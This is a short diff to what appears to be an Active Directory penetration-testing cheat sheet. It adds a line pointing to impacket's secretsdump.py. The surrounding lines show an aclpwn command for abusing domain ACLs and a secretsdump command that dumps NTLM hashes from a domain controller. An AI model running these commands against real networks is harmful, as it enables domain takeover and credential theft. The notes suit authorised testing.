@@ -121,6 +121,8 @@ https://github.com/fox-it/aclpwn.py
 aclpwn -du neo4j -dp 'Myneo4jPassword' -d name.local -f '<username>' -ft user -tt domain -t name.local -s IP
 ```
 Dumpling Credentials from the Domain Controller
+
+Download secretsdump.py from impacket or you can navigate to the impacket-scripts directory.
 ```
 python3 secretsdump.py -just-dc-ntlm <WORKSTATION>/<username>@<IP> 
 ```
